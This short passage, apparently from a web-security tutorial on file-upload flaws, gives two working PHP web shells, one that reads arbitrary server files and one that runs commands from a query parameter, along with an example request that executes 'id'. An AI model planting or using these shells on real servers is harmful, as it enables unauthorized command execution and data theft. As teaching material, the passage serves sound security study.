**The following PHP one-liner could be used to read arbitrary files from the server's filesystem:**

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

**A more versatile web shell may look something like this:**

```php
<?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:

```
GET /example/exploit.php?command=id HTTP/1.1
```
